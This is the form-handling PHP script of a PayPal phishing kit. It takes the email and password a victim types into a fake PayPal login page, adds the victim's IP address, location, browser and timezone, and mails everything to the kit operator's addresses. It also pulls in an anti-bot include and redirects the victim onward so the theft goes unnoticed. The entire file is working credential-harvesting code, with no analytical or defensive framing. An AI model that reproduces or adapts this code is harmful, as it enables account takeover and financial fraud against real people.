<?php
if (isset($_POST['EML']) && isset($_POST['PWD'])) {
    session_start();
    include '../mine.php';
    include '../../prevents/PrinceDuScam3.php';
    
    $_SESSION['EML'] = $_POST['EML'];
    $msg             = "=========== <[ Gego R3Z ComPTe Ppl ]> ===========\r\n";
    $msg .= "💰EMAIL        : {$_POST['EML']}\r\n";
    $msg .= "💰MDP        : {$_POST['PWD']}\r\n";
    $msg .= "---------------------- 📍 IP Info 📍 ----------------------\r\n";
    $msg .= "ADDRESSE IP    : {$_SESSION['ip']}\r\n";
    $msg .= "LOCATION    : {$_SESSION['ip_city']} , {$_SESSION['ip_countryName']} , {$_SESSION['currency']}\r\n";
    $msg .= "NAVIGATEUR        : {$_SESSION['browser']} on {$_SESSION['os']}\r\n";
    $msg .= "TIMEZONE    : {$_SESSION['ip_timezone']}\r\n";
    $msg .= "HEURE        : " . now() . " GMT\r\n";
    $msg .= "=========== <[ REZ VXV  PaYPal ComPTe ]> ===========\r\n\r\n\r\n";
    $subject = "🤑 PaYPal LoGiN [" . $_POST['EML'] . "|" . $_SESSION['ip_countryName'] . "] 🤑";
    $headers = "From: B1NK5 R3Z <binks@vip.su>\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    @mail($yours, $subject, $msg, $headers);
    @mail($antibot, $subject, $msg, $headers);
    exit(header("Location: ../../app/process"));
}
?>